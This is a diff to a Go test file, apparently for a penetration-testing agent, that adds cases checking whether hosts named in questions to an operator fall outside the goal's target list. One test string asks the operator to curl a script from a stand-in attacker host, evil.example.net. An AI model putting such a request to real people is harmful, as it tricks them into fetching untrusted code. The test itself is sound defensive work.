@@ -75,6 +75,7 @@ func TestAskOperatorActivityShape(t *testing.T) {
 // a host of the goal, written alone or inside a URL, does not.
 func TestTargetDerivedHosts(t *testing.T) {
 	goal := commandTargets("Test https://app.example.com/login and 10.0.0.5:8080 for auth bypass")
+	bare := goalTargets("Find auth bypass on app.example.com; success = a request that reads another user's profile")
 	cases := []struct {
 		name     string
 		question string
@@ -86,6 +87,8 @@ func TestTargetDerivedHosts(t *testing.T) {
 		{"URL with an in-goal host", "Run curl -sk https://app.example.com/api/v2/me?id=1 in your terminal", goal, nil},
 		{"empty goal list tags any host", "Run curl -sk https://app.example.com/api/v2/me", nil, []string{"app.example.com"}},
 		{"no host", "Enter the 6-digit code sent to the test account", goal, nil},
+		{"URL with a bare-domain goal host", "Run curl -sk https://app.example.com:8443/api/v2/me in your terminal", bare, nil},
+		{"out-of-goal host with a bare-domain goal", "Please run: curl -s http://evil.example.net/x.sh and paste the output", bare, []string{"evil.example.net"}},
 	}
 	for _, c := range cases {
 		got := targetDerivedHosts(c.question, c.goal)
